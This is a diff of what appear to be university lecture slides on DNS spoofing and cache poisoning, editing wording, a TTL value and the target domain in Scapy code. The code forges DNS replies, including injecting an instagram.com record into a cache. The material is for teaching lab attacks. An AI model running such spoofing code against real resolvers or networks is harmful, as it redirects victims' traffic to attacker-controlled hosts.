@@ -817,7 +817,7 @@ On the local machine (1), between the resolver and the local machine (2), betwee
 from scapy.all import *
 
 def spoof_dns(pkt):
-  if(DNS in pkt and 'www.example.com' in 
+  if(DNS in pkt and 'example.com' in 
                     pkt[DNS].qd.qname.decode('utf-8')):
      IPpkt  = IP(dst=pkt[IP].src,  src=pkt[IP].dst)
      UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
@@ -871,7 +871,7 @@ root@outer1:/# dig example.com
 ;example.com.     IN  A
 
 ;; ANSWER SECTION:
-example.com.    259140  IN  A 1.2.3.4
+example.com.    86400  IN  A 1.2.3.4
 
 ;; Query time: 1 msec
 ;; SERVER: 192.168.100.1#53(192.168.100.1) (UDP)
@@ -934,9 +934,8 @@ tc qdisc del dev eth0 root netem
 <h2 class="r-fit-text">3: DNS Cache Poisoning Attack</h2>
 
 [![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)
-- If it's local, it's much like the previous example
+- If one has access to the interface from the DNS server to the Internet, it's much like the previous example
   - Remote is harder, but possible
-- This is the right-most "attacker" icon in the diagram
 
 
 
@@ -970,7 +969,7 @@ tc qdisc del dev eth0 root netem
 from scapy.all import *
 
 def spoof_dns(pkt):
-  if(DNS in pkt and 'www.example.com' in 
+  if(DNS in pkt and 'example.com' in 
                     pkt[DNS].qd.qname.decode('utf-8')):
      IPpkt  = IP(dst=pkt[IP].src,  src=pkt[IP].dst)
      UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
@@ -1046,7 +1045,7 @@ Here, 1.2.3.6 is what the malicious nameserver returns
   1. Trigger the victim machine to perform a DNS query
   2. Negate the cache effect
   3. Spoof the reply
-- We are going to do this for a *sub-*domain of example.com
+- We are going to do this for a *sub-domain* of example.com
 
 
 
@@ -1338,7 +1337,7 @@ def spoof_dns(pkt):
 
     Anssec  = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                    rdata='1.2.3.4',ttl=259200)
-    Addsec1 = DNSRR(rrname='www.example.com', type='A',
+    Addsec1 = DNSRR(rrname='example.com', type='A',
                    ttl=259200, rdata='1.2.3.5')
     Addsec2 = DNSRR(rrname='instagram.com', type='A',
                     ttl=259200,rdata='1.2.3.6')
